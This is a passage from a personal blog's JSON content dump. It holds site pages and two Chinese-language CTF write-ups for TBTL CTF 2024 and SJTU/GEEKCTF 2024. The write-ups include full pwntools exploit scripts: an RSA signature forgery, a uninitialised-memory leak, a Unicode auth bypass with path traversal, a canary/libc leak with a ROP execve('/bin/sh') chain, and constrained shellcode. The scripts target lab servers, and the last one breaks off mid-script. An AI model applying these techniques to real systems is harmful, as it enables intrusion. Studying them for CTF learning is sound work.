{"meta":{"title":"BeaCox","subtitle":"On the way to be a hacker","description":"技术与生活分享","author":"BeaCox","url":"https://blog.beacox.space","root":"/"},"pages":[{"title":"","date":"2024-05-13T13:31:27.292Z","updated":"2024-05-13T13:31:27.292Z","comments":true,"path":"404.html","permalink":"https://blog.beacox.space/404.html","excerpt":"","text":"很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2024-05-13T13:31:27.296Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"manifest.json","permalink":"https://blog.beacox.space/manifest.json","excerpt":"","text":"{\"name\":\"App\",\"icons\":[{\"src\":\"/img/android-icon-36x36.png\",\"sizes\":\"36x36\",\"type\":\"image/png\",\"density\":\"0.75\"},{\"src\":\"/img/android-icon-48x48.png\",\"sizes\":\"48x48\",\"type\":\"image/png\",\"density\":\"1.0\"},{\"src\":\"/img/android-icon-72x72.png\",\"sizes\":\"72x72\",\"type\":\"image/png\",\"density\":\"1.5\"},{\"src\":\"/img/android-icon-96x96.png\",\"sizes\":\"96x96\",\"type\":\"image/png\",\"density\":\"2.0\"},{\"src\":\"/img/android-icon-144x144.png\",\"sizes\":\"144x144\",\"type\":\"image/png\",\"density\":\"3.0\"},{\"src\":\"/img/android-icon-192x192.png\",\"sizes\":\"192x192\",\"type\":\"image/png\",\"density\":\"4.0\"}]}"},{"title":"留言板","date":"2022-05-26T08:43:21.000Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"board/index.html","permalink":"https://blog.beacox.space/board/index.html","excerpt":"","text":"这里是本站的留言板，有什么想说的都可以在此留言 欢迎评论时填写邮箱，这样你将在收到回复时获得邮件通知 请勿发表不良言论，欢迎文明灌水！"},{"title":"网页书签","date":"2022-05-24T07:45:14.000Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"bookmarks/index.html","permalink":"https://blog.beacox.space/bookmarks/index.html","excerpt":"","text":"这里是我常用的一些网页 公益反代 渺软公益 CDNhttps://cdn.onmicrosoft.cn/ 哔哩CDNhttps://bilicdn.tk/ Source Global CDNhttps://www.sourcegcdn.com/ 图片下载 wallhavenhttps://wallhaven.cc/ unsplashhttps://unsplash.com/ pixabyhttps://pixabay.com/ pxherehttps://pxhere.com/ 音频下载 免费mp3下载https://free-mp3-download.net/ MyFreeMP3(国内可能无法正常访问)https://myfreemp3.to/ 淘声网https://www.tosound.com/ PPT模板下载 可画https://www.canva.cn/ HiPPTerhttp://www.hippter.com/ 字体下载 字由https://www.hellofont.cn/ 素材中国字库http://www.sccnn.com/ziku/ 100fonthttps://www.100font.com/ DaFont英文字体https://www.dafont.com/ 软件下载 可牛资源https://www.keniu.com/ 蓝鲨https://www.lan-sha.com/ 盒子部落https://www.hezibuluo.com/ Xclient(Mac)https://xclient.info/ 电子书下载 书格https://new.shuge.org/ 鸠摩搜书https://www.jiumodiary.com/ 天浪书屋https://www.tianlangbooks.com/ 脚本之家(仅IT)https://www.jb51.net/books/ 在线观影 鸭奈飞https://netflix.mom/ 91美剧网https://mjw91.com/ 哈哩哈哩动漫https://halihali7.com/ 哔咪动漫https://www.bimiacg4.net/ 帮你配色 ColorDrophttps://www.colordrop.io/ 中国色http://zhongguose.com/ 文件传输 钛盘https://app.tmp.link/空投https://airportal.cn/ 图床推荐 去不图床(强推)https://7bu.top/ AlphaPichttps://alpha.sourcegcdn.com/ SMMShttps://sm.ms/ 老王图床https://img.gejiba.com/ TG图床https://imgtg.com/ 聚合图床https://www.superbed.cn/ imgURL图床https://www.imgurl.org/vip/manage/upload hello图床https://www.helloimg.com/ 各种镜像站 GitHub镜像https://hub.nuaa.cf/ 南大谷歌镜像https://search.njau.cf/ 烂番薯谷歌学术镜像https://scholar.lanfanshu.cn/ 维基百科镜像https://www.tw.3822808.com/ Stille部署的RSSHubhttps://rsshub.rssforever.com/ 其他工具 在线文件格式转换https://www.convertfiles.com/Unicode百科https://unicode-table.com/cn/"},{"title":"所有分类","date":"2022-05-20T12:08:25.000Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"categories/index.html","permalink":"https://blog.beacox.space/categories/index.html","excerpt":"","text":""},{"title":"友链新文","date":"2022-05-21T16:46:47.000Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"fcircle/index.html","permalink":"https://blog.beacox.space/fcircle/index.html","excerpt":"","text":""},{"title":"友链","date":"2024-05-13T13:31:27.296Z","updated":"2024-05-13T13:31:27.296Z","comments":false,"path":"friends/index.html","permalink":"https://blog.beacox.space/friends/index.html","excerpt":"","text":"好兄弟全站友链博友们 暂停友链互换 什么情况会被删除友链 不再满足本站添加友链的要求删除本站友链且提醒后仍未重新添加超过1年没有实质性内容更新友链，重要的是友而非链，若无意交友，则将删除友链通常情况下，本站会在删除前联系博主，若未能取得联系，则即日起7天后删除，解释权归本站所有。 友情链接及友链新文免责声明 友链的文章我会不定期阅读，出现有害内容的可能性较小，但在你点击链接跳转访问时，仍可能面临安全性问题，包括但不限于：访问被劫持、重定向友链站长的服务器被挂马、网站被注入恶意代码友链域名到期，被不法分子抢注并利用友链站点非法收集或泄露用户隐私……如果因为从友链以及友链新文页面跳转造成了你的损失，本站概不负责。"},{"title":"我的项目","date":"2022-10-14T13:44:01.000Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"projects/index.html","permalink":"https://blog.beacox.space/projects/index.html","excerpt":"","text":"看雪论坛定时自动签到脚本 使用TailwindCSS设计的个人主页"},{"title":"","date":"2022-05-20T18:05:49.000Z","updated":"2024-05-13T13:31:27.296Z","comments":true,"path":"record/index.html","permalink":"https://blog.beacox.space/record/index.html","excerpt":"","text":"大事记 2022-10-26 更换域名 将博客域名从bowenyoung.cn改为blog.beacox.space 2022-09-29 删除不必要功能 由于leancloud国际版访问的问题，删除了说说功能音乐播放器拖慢网页加载速度且使用较少，故删除 2022-06-22 访客纪录 本站总访问量首次突破10,000 2022-06-16 使用CDN 本站使用又拍云提供CDN加速服务 2022-06-15 更换图床 本站图床从老王图床更换至深海图床，感谢Arcitcgn提供的免费图床服务 2022-06-14 ICP备案 本站完成ICP备案 2022-06-09 更换评论系统 本站评论系统从Waline改为Artalk，感谢杜老师为本站Artalk部署提供的服务器托管服务以及全方位的指导😘😘😘 2022-06-06 访客纪录 今日，本站总访客数（uv）首次突破 1, 000 2022-06-04 使用图床 本站大部分图片存储在免费的老王图床 2022-05-26 新增功能 新增了友链新文的功能GitHub项目：友链朋友圈 2022-05-25 更换部署方式 本站原先部署在GitHub Page，为提升国内访问速度，现已迁移到Vercel 2022-05-21 更换域名 本站域名从https://bowenyoung.cf 改为 https://bowenyoung.cn 2022-05-20 二度更换主题 在对icarus进行了多次魔改后还是决定换主题。毕竟pjax对网站加载速度的优化实在显著。最后改为volantis主题。 2022-04-13 更换主题 next实在是过于简洁，有些功能很难实现。最后改为了icarus主题。 2022-04-03 建站 利用hexo+GitHub page搭建了自己的博客，在butterfly和next主题中选择了更简洁的next。"},{"title":"所有标签","date":"2024-05-13T13:31:27.300Z","updated":"2024-05-13T13:31:27.300Z","comments":true,"path":"tags/index.html","permalink":"https://blog.beacox.space/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"TBTL CTF 2024 WriteUp","slug":"tbtlctf-2024-wp","date":"2024-05-13T06:45:00.000Z","updated":"2024-05-13T12:00:00.000Z","comments":true,"path":"posts/tbtlctf-2024-wp/","link":"","permalink":"https://blog.beacox.space/posts/tbtlctf-2024-wp/","excerpt":"","text":"前言在 discord 上认识了一群来自世界各地的 ctfer，不过大家都不是什么老赛棍，just ctf for fun!有人在频道里提议参加TBTL CTF 2024，然后就组了个队。比赛时间2天，实际上没什么时间打，做了几个方向的新手友好题。不过队里有个哥们 web 方向 3/4，最后队伍排名36。 Tower of Babel这是一道简单的社工题。 mp3 文件里有这道题的提示： 该标志的格式如常，我们的合作伙伴云海连锁控股有限公司总部位于海南岛海口附近。找到距离他们的办事处最近的银行。标志内的内容是该银行的统一社会信用代码。代码已以91开始，以56结束。 首先搜这家公司，可以通过这个网站找到其地址，打开高德地图搜索“云海链8831栋”可以找到该公司位置，然后再搜周边——银行，可以看到最近的银行是海南澄迈农村商业银行股份有限公司科技支行。 然后我们搜索其社会信用代码，得到91469027MA5TRBAW56。 因此 flag 为 TBTL{91469027MA5TRBAW56}。 Wikipedia Signatures这是一道非常简单的数字签名攻击题目。我们的目标是获取bytes_to_long(b'I challenge you to sign this message!')的数字签名。同时，我们可以提供任何消息给签名者进行数字签名，因此很容易想到这是 RSA 数字签名中的选择消息攻击。 我们假设m = bytes_to_long(b'I challenge you to sign this message!') ，我们的目标是获取其数字签名： $$ s = m^{d};mod;n$$ 首先，我们让签名者为任意选择的消息 m1 进行签名（这里我选用m1 = bytes_to_long(b'BeaCox')），获取对应的签名： $$s_1=m_{1}^{d};mod;n$$ 然后，我们计算 $$m_2:=m⋅m_{1}^{−1};mod;n$$ 并让签名者为其签名，得到 $$s_2=m_2^d;mod;n$$​ 由于 $$s≡s1⋅s2≡m_1^d⋅m_2^d≡m_1^d⋅(m⋅m_1^{-1})^d≡m_1^d⋅m^d⋅m_1^{-d}≡m^d;(mod;n)$$ 我们很容易得到 $$s=s1⋅s2;mod;n$$ 利用代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940# https://crypto.stackexchange.com/questions/35644/chosen-message-attack-rsa-signaturefrom pwn import *from Crypto.Util.number import inverse, bytes_to_longp = remote('0.cloud.chals.io', 31148)def find_m2(m, n, m1): m1_inv = inverse(m1, n) m2 = (m * m1_inv) % n return m2def get_n(): p.recvuntil(b\"RSA public key: (\") n = p.recvuntil(b\",\", drop=True) p.recvuntil(b'Sign any other message using wikipedia-RSA') return int(n)def menu(): p.recvuntil(b'&gt; ')def sign(message): menu() p.sendline(f'2 {message}'.encode()) return int(p.recvline().strip())def win(signature): menu() p.sendline(f'1 {signature}'.encode())m = bytes_to_long(b'I challenge you to sign this message!')n = get_n()m1 = bytes_to_long(b'BeaCox')m2 = find_m2(m, n, m1)s1 = sign(m1)s2 = sign(m2)signature = (s1 * s2) % nwin(signature)p.interactive()# TBTL{r3p347_4f73r_m3-d16174l_516n47ur3_15_n07_3ncryp710n} Floo Powder这是一道简单的逆向题。从 ida 获取静态的数组，然后根据反编译的代码写 z3 的约束，编写 python 脚本来得到正确的输入。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# input is 31*31 bit(0 or 1) stringfrom pwn import *from z3 import *data = [ 0x04CA4952, 0x69745A2A, 0x434A2A90, 0x36D0A9C7, 0x1002DAC8, 0x04933AEB, 0x71A29525, 0x6DA8D531, 0x69259680, 0x2179213C, 0x5D8A6097, 0x6ACA2822, 0x5495ED02, 0x255A2CD5, 0x16B5625A, 0x2E8A8ABA, 0x2D6F5EB4, 0x557CD952, 0x2CB4E495, 0x020D29B9, 0x0E8B2854, 0x4646C159, 0x47749281, 0x54229D46, 0x6C1CD620, 0x07F80EFF, 0x04AD46A4, 0x32EBC04E, 0x4FAC1623, 0x600E1F04, 0x24CD3000]# z3 init the inputinput = [BitVec(f\"input{i}\", 1) for i in range(31*31)]s = Solver()def important_func(o_i, i_i, count): # print(f\"index1: {index1}, index2: {index2}\") # ( (input[31 * o_i + i_i] == 49) == (((data[count / 31] &gt;&gt; (31 - count % 31 - 1)) &amp; 1) != 0) ) s.add((input[31 * o_i + i_i] == 1) == (((data[count // 31] &gt;&gt; (31 - count % 31 - 1)) &amp; 1) != 0))outside_index = 0inside_index = 0count = 0v9 = 1while (outside_index &lt; 31 and inside_index &lt; 31): important_func(outside_index, inside_index, count) count += 1 if v9 == 1: v10 = outside_index - 1 v11 = inside_index + 1 else: v10 = outside_index + 1 v11 = inside_index - 1 if v10 &lt; 0 or v10 == 31 or v11 &lt; 0 or v11 == 31: if v9 == 1: outside_index += inside_index == 30 inside_index += inside_index &lt; 30 else: inside_index += outside_index == 30 outside_index += outside_index &lt; 30 v9 = 1 - v9 else: outside_index = v10 inside_index = v11flag = \"\"if s.check() == sat: m = s.model() for i in range(31*31): flag += str(m[input[i]]) print(flag) 我们会得到一个 31*31 的由0和1组成的矩阵： 123456789101112131415161718192021222324252627282930310000000000000000000000000000000011111110010001101001001111111001000001011011001111000100000100101110100111001100001010111010010111010110101011110001011101001011101000101100000010101110100100000101010011100001010000010011111110101010101010101111111000000000000001001101110000000000111110111110110001011101010100000100101010001001000111111110001010001101011111111010011000000100110011111000100100100110100000101010110101010111100101100000000110011101100110010001010000111000100100011101001010111000011111000101010001000001111011001001011110001110000000001101000101101000100011011011101110100010001110001110110100111101100001011000110110011000011010101000100100100111000110001111101000000000000101011000011100010100001111111011000111100110101000000100000100000110010101000100000010111010100010110110111111111001011101010000000100111011101100101110101111100100111011100100010000010110100111001010100010001111111011110001111100111110000000000000000000000000000000000 可以看到这个矩阵的周围一圈都是0，如果把周围这一圈0都去掉，那么就是一个29*29的矩阵。把0看成白色，1看成黑色，那么这个矩阵看起来就是一个29*29的第三代二维码，写脚本将01矩阵转换为二维码图片： 123456789101112131415# convert to qrcodefrom PIL import ImageMAX = 31pic = Image.new(\"RGB\",(MAX, MAX))i=0for y in range (0,MAX): for x in range (0,MAX): if(flag[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(\"flag.png\")# TBTL{Wh47_D1d_H3_5aY_D34r?_D14g0nal1y...} 扫描二维码就可以获得 flag 。 Enough with the averages这是一道利用了scanf函数特性的pwn题。 这道题允许我们输入20个4字节长的整数，然后输出这20个整数的平均值。但是存储这些整数的内存区域含有先前读取的flag。 这个程序使用20个 __isoc99_scanf(\"%d\", &amp;v3[i]); 来读取我们的输入。如果我们输入了一个字符，那么从此以后的scanf都会直接返回-1，导致对应内存区域的4字节为原来的值，最终导致内存泄漏。 我的想法是：首先输入19个0，然后输入一个a，就可以得到目标内存区域的第20个4字节(data[19])；然后启动另一个程序，输入18个0，然后输入一个a，就可以得到data[18]+data[19]，计算可得data[18]，依次类推可以得到目标区域的所有20*4个字节。然后就可以重构出flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.binary = binary = ELF('./chall')context.log_level = 'critical'# we need record 20 int numbersnumbers = [0] * 20sum = 0def input(number): p.sendlineafter(b':', number)def recv_average(): p.recvuntil(b'Average score is ') byte_string = p.recvline().strip()[:-1] return float(byte_string)for i in range(16): # p = binary.process() p = remote('0.cloud.chals.io', 10198) zeros = 19 - i print(f'zeros: {zeros}') # input zeros times of 0 for _ in range(zeros): input(b'0') input(b'a') average_score = recv_average() print(f'average_score: {average_score}') tmp = sum sum = average_score * 20 numbers[zeros] = int(sum - tmp) if numbers[zeros] &lt; 0: numbers[zeros] = 0x100000000 + numbers[zeros] print(f'numbers[{zeros}]: {hex(numbers[zeros])}') p.close()flag = b''for i in range(4, 20): char1 = numbers[i] &amp; 0xff char2 = (numbers[i] &gt;&gt; 8) &amp; 0xff char3 = (numbers[i] &gt;&gt; 16) &amp; 0xff char4 = (numbers[i] &gt;&gt; 24) &amp; 0xff flag += bytes([char1, char2, char3, char4])print(flag)# TBTL{e4t_Y0ur_vegG13s_1n1714l1z3_y0ur_d4rn_v4r14bl35} 总结Fun!!! 感谢主办方，难度梯度做得很好。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.beacox.space/categories/CTF/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://blog.beacox.space/tags/PWN/"},{"name":"Misc","slug":"Misc","permalink":"https://blog.beacox.space/tags/Misc/"},{"name":"Reverse","slug":"Reverse","permalink":"https://blog.beacox.space/tags/Reverse/"},{"name":"Crypto","slug":"Crypto","permalink":"https://blog.beacox.space/tags/Crypto/"}]},{"title":"SJTU CTF 2024 暨 GEEKCTF 2024 WriteUp","slug":"sjtuctf-2024-wp","date":"2024-04-26T06:30:00.000Z","updated":"2024-04-26T06:30:00.000Z","comments":true,"path":"posts/sjtuctf-2024-wp/","link":"","permalink":"https://blog.beacox.space/posts/sjtuctf-2024-wp/","excerpt":"","text":"前言记录一下打CTF以来做出题目最多的一次。这次的题目是 SJTU CTF 2024 校内赛和第一届 GEEKCTF 共用的。所有题目都可以在GEEKCTF官网找到，由于我是在校内平台做的，flag可能会略有不同，但是解题的方法应该是一样的。 WEBSecrets本题的漏洞点是任意文件读取+特殊字符绕过upper/lower。 攻击流程如下： 选一个主题后，在登录页面抓包，发现有一个redirectCustomAsset路由 123Accept-Encoding: gzip, deflateAccept-Language: en,en-US;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: asset=assets/css/pico.cyan.min.css 看上去是用来读取不同主题的css文件，但是是相对于网站根目录的相对路径。因此猜测可以读取网站目录下的所有文件。 在登陆页面查看网页源代码，发现body后面有一串看不懂的编码，放到cyberchef里一个个试发现是Base85： 解码结果 其中比较重要的是app.py和populate.py。 将Cookie改成asset=app.py会回显hacker，改成asset=assets/css/../../app.py即可得到网站的源代码。 在app.py里面硬编码了用户名和密码： 1234567def isEqual(a, b): return a.lower() != b.lower() and a.upper() == b.upper()……if isEqual(username, \"alice\") and isEqual(password, \"start2024\"): session[\"logged_in\"] = True session[\"role\"] = \"user\" return redirect(\"/\") 但是isEqual要求用户名和密码都需要满足小写化后不等于硬编码的用户名/密码，大写化后又要等于。第一眼看懵了，小写不相等但是大写相等？问下claude： 进一步搜索发现upper对unicode特殊字符的处理有些问题，用unicode包裹起来才会得到正确的大写。不过claude给的字符似乎不对，直接用Python遍历unicode字符好了： 123456789101112def find_replacement_char(ch): # 遍历 Unicode 字符范围 0x0000 到 0x10FFFF for i in range(0x110000): try: char = chr(i) if char.upper() == ch.upper() and char!=ch and char!=ch.upper(): print(char) except ValueError: # 某些 Unicode 码点无法转换为有效字符,跳过 passfind_replacement_char('i') 只找到了i的替代字符ı，s的替代字符ſ。输入用户名alıce，密码ſtart2024，登录成功！ 再看看populate.py： 1234567891011121314151617181920212223import osfrom app import Notes, app, dbwith app.app_context(): db.create_all() if not Notes.query.filter_by(type=\"notes\").first(): db.session.add(Notes(title=\"Hello, world!\", message=\"This is an example note.\")) db.session.add( Notes( title=\"Where's flag?\", message=\"Flag is waiting for you inside secrets.\", ) ) if not Notes.query.filter_by(type=\"secrets\").first(): db.session.add( Notes( title=\"Secret flag\", message=os.environ.get(\"FLAG\", \"fake{flag}\"), type=\"secrets\", ) ) db.session.commit() 也就是说“type=secrets”会给我们flag，但是在app.py里还有过滤： 12345678910111213type = request.args.get(\"type\", \"notes\").strip()if (\"secrets\" in type.lower() or \"SECRETS\" in type.upper()) and session.get( \"role\") != \"admin\": return render_template( \"index.html\", notes=[], error=\"You are not admin. Only admin can view secre&lt;u&gt;ts&lt;/u&gt;.\", )q = db.session.query(Notes)q = q.filter(Notes.type == type)notes = q.all()return render_template(\"index.html\", notes=notes) 我们需要让and前面的逻辑表达式为否才能够不返回错误、获得flag。 因此要想查看flag，type的参数需要是secrets的变体，页面上给secrets的ts划了下划线，猜测是提示将这两个字符换成特殊字符。 打开Burp的intruder，payload选用simple list，从网上下载了一个特殊字符的列表来爆破ts。 最后ts替换成Æ¾时，response的length不一样，点进去看详情就能看到flag。 flag: 10ops{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1} PWNMemo0本题的漏洞点是整数溢出和栈溢出。但是用不到，只需要逆向出密码。 攻击流程如下： 首先要输入密码登录，密码通过一个加密算法后与J8ITC7oaC7ofwTEbACM9zD4mC7oayqY9C7o9Kd==对比，长得很像base64，但是用base64解码出来不对。把sub_12E9的加密函数丢给claude，直接逆出了密码。。。 1234567891011121314151617181920212223242526272829303132333435363738def decode(encoded_data): # 计算解码后的数据长度 length = len(encoded_data) decoded_length = (length * 3) // 4 if encoded_data[-1] == '=': decoded_length -= 1 if encoded_data[-2] == '=': decoded_length -= 1 # 创建解码后的数据缓冲区 decoded = bytearray(decoded_length) # 标准 Base64 字符映射表 base64_chars = \"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/\" # 遍历编码数据并解码 for i in range(0, length, 4): value = 0 for j in range(4): if i + j &lt; length: char = encoded_data[i + j] if char == '=': value &lt;&lt;= 6 * (3 - j) else: value |= base64_chars.index(char) &lt;&lt; 6 * (3 - j) # 将 24 位值拆分成 3 个字节并写入解码后的数据 decoded_pos = i // 4 * 3 decoded[decoded_pos] = (value &gt;&gt; 16) &amp; 0xFF if decoded_pos + 1 &lt; decoded_length: decoded[decoded_pos + 1] = (value &gt;&gt; 8) &amp; 0xFF if decoded_pos + 2 &lt; decoded_length: decoded[decoded_pos + 2] = value &amp; 0xFF return decoded.decode('latin-1')print(decode('J8ITC7oaC7ofwTEbACM9zD4mC7oayqY9C7o9Kd=='))# CTF_is_interesting_isn0t_itÀ 但是好像有点问题，将À改成?就对了。 一开始没有在本地新建flag文件，ida里面还把win函数看漏了。。。导致还在继续用栈溢出去劫持control flow调用win，其实逆向出密码就可以得到flag。 完整exp： 12345nc 111.186.57.85 40310===================Memo Login===================Please enter your password: CTF_is_interesting_isn0t_it?Login Success!0ops{U_r_th3_ma5ter_0f_ba5e64} flag: 10ops{U_r_th3_ma5ter_0f_ba5e64} Memo1本题的漏洞点是整数溢出和栈溢出。 攻击流程如下： 首先checksec： 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledRUNPATH: b'.' 保护全开。然后看main函数，发现供用户输入的字符串在栈上，大小是264字节，乍一看用户也只能输入0x100即256字节，很安全。但是在实现edit功能的函数里面： 1234567891011121314lea rax, aLld ; \"%lld\"mov rdi, raxmov eax, 0call ___isoc99_scanfmov edx, [rbp+var_1C]mov rax, [rbp+var_10]cmp rdx, raxjle short loc_1873mov rax, [rbp+var_10]mov edx, eaxmov rax, [rbp+var_18]mov esi, edxmov rdi, raxcall sub_170E 可以发现，允许用户输入的是有符号数，而比较的时候却是根据无符号数进行比较，然后在读取用户输入的时候又使用其低32位作为允许输入的长度，因此会出现类似0xffffffff00000109 &lt; 0x8的情况，却允许用户输入0x109个字节。 为了能够输入我们想要的长度，需要将0xffffffff00000109这样的数转换成相应的负数： 12def convert_to_signed(num): return (-1)*(0xffffffff-num)-1 至此，我们总结一下能够利用的漏洞： 可以利用整数溢出在栈上写非常长的内容，因此可以利用栈溢出劫持程序控制流。 但是由于保护全开且没有win函数，因此我们需要先leak canary，然后leak libc，最后在栈上布局 ROP chain 来 get shell。 我们先在sub_170e函数（读取用户输入的函数）处下一个断点，观察栈的布局。 发现canary距离用户输入的起始位置为0x108字节，因此我们需要覆盖用户输入的前0x109字节为非0字符，然后调用show就可以连带canary一起输出出来。而读取用户输入的sub_170e函数是一个带0截断的函数：当我们输入\\n会被替换成\\x00，如果长度参数正好等于我们输入的长度，就不会添0。因此我们需要让其长度参数恰好等于0x109，也就是在调用edit时，输入的长度为convert_to_signed(0x109)。然后输入0x109个A，再调用show，最后7位就是canary的高7位。 用户输入的起始位置加上0x118个字节是libc的地址，与基地址的偏移是0x29d90，使用和leak canary几乎一样的方法可以leak libc。 最后就是在栈上布局 rop chain 了。因为有libc，因此可以直接用libc的gadgets，使用pwntools构造一个execve(‘/bin/sh’,0,0)的Rop，在栈上canary的位置填入canary，返回地址处布局rop chain，即可得到shell。 1234rop = ROP(libc)rop.execve(next(libc.search(b'/bin/sh\\x00')), 0, 0)payload = b'A' * 0x108 + p64(canary) + b'B' * 0x8 + rop.chain()edit(convert_to_signed(len(payload)), payload) 完整exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *binary = context.binary = ELF('./memo1')libc = binary.libc# p = process(binary.path)p = remote('111.186.57.85', 40311)password = b'CTF_is_interesting_isn0t_it?'p.recvuntil(b'Please enter your password: ')p.sendline(password)# then it is a overflowdef add(payload): p.sendlineafter(b'Your choice:', b'1') p.sendlineafter(b'What do you want to write in the memo:', payload)def show(): p.sendlineafter(b'Your choice:', b'2') p.recvuntil(b'Content:\\n') return p.recvline()[:-1]def edit(length, payload): p.sendlineafter(b'Your choice:', b'3') p.sendlineafter(b'How many characters do you want to change:', str(length).encode()) p.send(payload)def get_flag(): p.sendlineafter(b'Your choice:', b'114514') p.interactive()# beause there is a jle instruction, so we can use negative number to bypass itdef convert_to_signed(num): return (-1)*(0xffffffff-num)-1main_offset = 0x1938libc_offset = 0x29d90### first leak canaryadd(b'A' * 0x8)edit(convert_to_signed(0x109), b'A'*0x109)response = show()canary = response[0x109:0x109+7].rjust(8, b'\\x00')canary = u64(canary)info(f'[LEAK]: canary: {hex(canary)}')### leak libc addresspayload = b'A' * 0x118edit(convert_to_signed(len(payload)), payload)response = show()libc_leak = response[0x118:0x118+6].ljust(8, b'\\x00')libc_leak = u64(libc_leak)info(f'[LEAK]: libc_leak: {hex(libc_leak)}')libc.address = libc_leak - libc_offsetinfo(f'[LEAK &amp; CALC]: libc_base: {hex(libc.address)}')### leak pie address# payload = b'A' * 0x128# edit(convert_to_signed(len(payload)), payload)# response = show()# main_addr = response[0x128:0x128+6].ljust(8, b'\\x00')# main_addr = u64(main_addr)# elf.address = main_addr - main_offset# info(f'[LEAK &amp; CALC]: pie_base: {hex(elf.address)}')# gdb.attach(p, '''# ''')### no win_func now, wo we use roprop = ROP(libc)rop.execve(next(libc.search(b'/bin/sh\\x00')), 0, 0)payload = b'A' * 0x108 + p64(canary) + b'B' * 0x8 + rop.chain()edit(convert_to_signed(len(payload)), payload)get_flag() flag: 10ops{5t4ck_0v3rfl0w_1s_d4ng3r0u5_233} Shellcode本题的考察点正如题名是shellcode，但是seccomp只允许了open和read，没有write，因此需要利用循环来实现类似侧信道攻击。另外，对shellcode的字节做了限制： 偶数索引处的字节必须是偶数，奇数索引处的字节必须是奇数 12345for ( i = 0; i &lt; v5; ++i ){ if ( (char)(*((char *)buf + i) % 2) != i % 2 ) return 0xFFFFFFFFLL;} 大于0x80的奇数不能用 12345678910mov rax, [rbp+buf]add rax, rdxmovzx eax, byte ptr [rax]mov edx, eaxsar dl, 7shr dl, 7add eax, edxand eax, 1sub eax, edxmovsx ecx, al 这段实际上是将shellcode的字节作为一字节的有符号数来对2取模，因此类似于0x81这样的大于0x80的奇数模2后的结果是-1而不是1，但是对索引的取模是看作无符号数，因此奇数索引处取模是1而不等于-1。这也就代表着大于0x80的奇数不能出现在shellcode中，这点非常坑。。。比前一点限制花了我更多时间。因为这个限制相当于把一般的jmp长跳转、call、ret、syscall全都禁止掉了。 思路： 由于我们还要进行侧信道攻击，不可能每爆破一个字节都构造一个能满足要求的shellcode，因此考虑分两个阶段： 阶段1：调用read函数，rdi设置一阶段shellcode的起始位置，并将返回地址设置为这个起始地址 阶段2：输入二阶段进行侧信道攻击的shellcode，read将返回到我们输入的这个shellcode 每个二阶段shellcode爆破一个字节：将[flag_addr+i]与每个可见字符作比较，相等时进入死循环，通过对时间的测量就能知道flag的每个字节是哪个字符值。 开凑： 先凑一阶段的shellcode。由于限制非常多，因此考虑尽量利用栈上已有的内容和寄存器中已有的内容（pop和push某个寄存器都是一字节的指令，不同寄存器奇偶性质不同，很容易满足限制的要求）。 rsp的最顶端是返回地址即main+0xc4，我们将这个地址pop到rax，然后对rax进行xor操作，可以得到read@plt，方便后续调用read库函数。有了这个思路，我们就需要布置好read的参数。rdi现在恰好是0，符合我们的要求，不去修改。rsi也是输入的起始地址不需要修改。rdx需要修改为我们想要输入的长度，经过观察rsp+0x8处的低8位正好是我们一阶段输入的长度，因此我们只需要将rsp+0x8的低8位值放到rdx中去即可： 12345678pop raxpop rbxnopxor edx, ebxpop rbxxor ax, 0x03e6xor ax, 0x100sub al, 1 这样就已经将read@plt放到了rax里面，并布置好了rdi, rsi 和 rdx。接下来的问题就是如何调用rax中存储的函数。已知jmp的长跳转、call、ret、syscall都不符合这道题的过滤要求。怎么办？想起之前用ROPgadget的时候看到ret{num}这种形式的指令，去搜了一下，发现是ret之后，令rsp增加num字节。字节码是：b'\\xc2\\x01\\x00'正好满足要求。但是又出现一个新的问题： 栈指针增长奇数个字节后，我们就无法控制返回地址了。 因此想到，如果在ret {num}之前先让栈增长或者减少奇数字节，而且这个命令能够通过过滤，就能解决这个问题。搜索发现有一个enter指令： enter指令的完整格式是: 1enter bytes, level 其中: bytes是一个立即数,表示当前函数需要在栈上分配的空间大小(以字节为单位)。这个值通常就是函数内局部变量所需的大小。 level是另一个立即数,表示嵌套函数调用的层数。通常这个值为 0。 我这里用一个enter 0x1, 0x3，level是我随便指定的，在gdb里面看效果： 栈指针减少了0x21字节，那么我们再用ret 9就可以让栈重新和8字节对齐，在那之前先把read@plt的地址push入栈，ret的时候才能返回到read，等后面栈指针增加和8字节对齐的时候可以返回到我们在enter之前push入栈的shellcode地址。 123456789101112131415noppush rbxpush raxpush rbxpush raxpush rbxenter 0x1, 0x3noppop rbxpush raxpush rbxnoppop rbxret 0x0009pop rbx 至此第一阶段就构造完成了，第二阶段的shellcode就是open(‘flag’, 0)然后read第i个索引处的字节，与各个可见字符进行比较，如果相等就死循环，通过时间判断是否命中，逐字节爆破到}为止，完整exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126# no write for us# defeat seccomp reference: https://tttang.com/archive/1447/#toc_wirte# by pass shellcode check reference: # - https://www.roderickchan.cn/zh-cn/2022-04-30-angstromctf-pwn/# - https://ctftime.org/writeup/33656# - https://hackmd.io/@DJRcJnpzRDK3J_8-dhv_dA/rycDEyFSq#parity# - https://www.aynakeya.com/ctf-writeup/2022/angstrom/pwn/parity/from pwn import *binary = context.binary = ELF('./shellcode')# context.log_level = 